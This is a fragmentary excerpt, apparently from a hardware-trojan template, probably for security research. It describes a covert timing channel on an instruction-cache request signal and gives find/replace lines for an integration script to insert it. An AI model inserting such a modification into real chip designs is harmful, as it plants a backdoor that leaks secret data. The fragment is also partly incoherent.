 ...
 * Payload: Modulate timing of icache_data_req_i based on secret data
 * 
...
assign secret_bit = icache_data_req_i[0];
...
// ============================================================
// Covert Channel: Modulate timing of icache_data_req_i
//
// Integration Script Must Modify:
//
// IF icache_data_req_i is timing-sensitive:
//   Find: assign icache_data_req_i = ready_signal;
//   Replace: assign icache_data_req_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
